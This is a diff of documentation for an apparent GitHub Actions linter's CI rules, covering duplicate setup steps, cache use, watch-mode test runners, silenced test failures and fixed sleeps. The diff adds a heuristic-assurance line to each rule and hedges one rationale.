@@ -2636,6 +2690,7 @@ A job should not run the same toolchain setup action twice with the same inputs.
 
 **Why:** Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: low
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2674,6 +2729,7 @@ Jobs that repeat the same leading setup steps could share a composite action.
 
 **Why:** When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: low
 - Presets: `insights`
 - Options: `minJobs` (default `3`), `minSteps` (default `3`)
@@ -2723,8 +2779,9 @@ References:
 
 Several jobs in a workflow should not each rebuild the same project from scratch.
 
-**Why:** When multiple jobs run the same build command on the same runner type, the workflow pays for the build several times and the jobs may test or ship slightly different outputs. Building once and passing the result through an artifact cuts runner minutes and guarantees every downstream job uses the same bits.
+**Why:** Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2774,6 +2831,7 @@ A job should not run the same non-trivial shell command more than once.
 
 **Why:** Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 
@@ -2806,6 +2864,7 @@ A job or step should not redefine an environment variable to the value it alread
 
 **Why:** Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low; autofix available
 - Presets: `recommended`, `strict`
 
@@ -2842,6 +2901,7 @@ Workflows should agree on the toolchain version they install with each setup act
 
 **Why:** When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2881,6 +2941,7 @@ Jobs that download Playwright browsers should cache them or run in the Playwrigh
 
 **Why:** `playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2918,6 +2979,7 @@ ESLint, tsc and Jest should keep their incremental caches between CI runs.
 
 **Why:** ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `agentic`, `strict`
 
@@ -2955,6 +3017,7 @@ Test runners and compilers in CI should run once instead of in watch mode.
 
 **Why:** A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2985,6 +3048,7 @@ Uploads of test debugging output (reports, traces, videos, screenshots) should r
 
 **Why:** A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low; autofix available
 - Presets: `agentic`, `strict`
 
@@ -3023,6 +3087,7 @@ Test failures should fail the job, not be silenced by `continue-on-error: true` 
 
 **Why:** When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3052,6 +3117,7 @@ Jobs that restore a package-manager cache should not clear or bypass that cache 
 
 **Why:** Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `agentic`, `strict`
 
@@ -3087,6 +3153,7 @@ Run steps should wait for services to become ready instead of sleeping for a fix
 
 **Why:** A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `minSeconds` (default `5`)
